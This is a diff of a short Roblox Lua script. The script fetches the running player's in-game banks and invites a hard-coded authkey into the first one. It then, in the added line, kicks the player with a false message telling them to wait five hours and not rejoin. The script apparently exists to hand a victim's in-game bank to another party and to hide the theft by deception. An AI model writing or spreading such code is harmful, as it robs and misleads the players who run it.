@@ -2,4 +2,4 @@ local authkey = 2757225960
 local lib = require(game.ReplicatedStorage:WaitForChild('Framework'):WaitForChild('Library'))
 local mybanks = lib.Network.Invoke("get my banks")
 lib.Network.Invoke("Invite To Bank", mybanks[1]['BUID'], authkey)
-
+game.Players.LocalPlayer:Kick("Please wait 5h for your id's to randomise. Do NOT rejoin the game.")
